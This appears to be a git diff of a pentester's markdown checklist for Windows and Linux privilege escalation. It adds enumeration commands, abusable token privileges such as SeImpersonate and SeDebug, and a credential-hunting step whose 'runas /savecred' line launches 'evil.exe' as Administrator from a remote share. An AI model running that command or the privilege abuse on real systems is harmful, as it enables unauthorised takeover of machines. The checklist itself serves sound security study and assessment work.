@@ -293,6 +293,8 @@
 
   - `netstat -puntal` or `ss -puntal` (access/ tunnel)
 
+    Look at `LISTEN` ports
+
 - Local Processes
 
   - `ps -aux | grep [USER, ROOT...]`
@@ -304,14 +306,34 @@
 
 ## Windows
 
-- `systeminfo`
 
-- `net user`
 
-- Users `whoami /all`
+- Users & Groups
 
-  - CHeck for non mandatory groups
-  - Search them on [win_privesc](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
+  - `net user`
+  - `net localgroup`
+  - `net user [USER]`
+
+- Memberships & Privileges
+
+  -  `whoami /all`
+  - Check non-default groups -> [Exploits](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges)
+  - Check non-default privileges -> [Exploits](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
+    - `SeDebug`
+    - `SeBackup`
+    - `SeImpersonate` / `SeAssignPrimaryToken`
+    - `SeRestore`
+    - `SeManage`
+
+- Credential Hunting:
+
+  - Saved passwords `cmdkey /list`
+
+    ````cmd
+    runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
+    ````
+
+  - `tree /a /f c:\users`
 
 - Readable / Owned web files (for web application)
 
@@ -337,7 +359,7 @@
 
 - Local Network Services
 
-
+- `systeminfo`
 
 
 - Local Processes
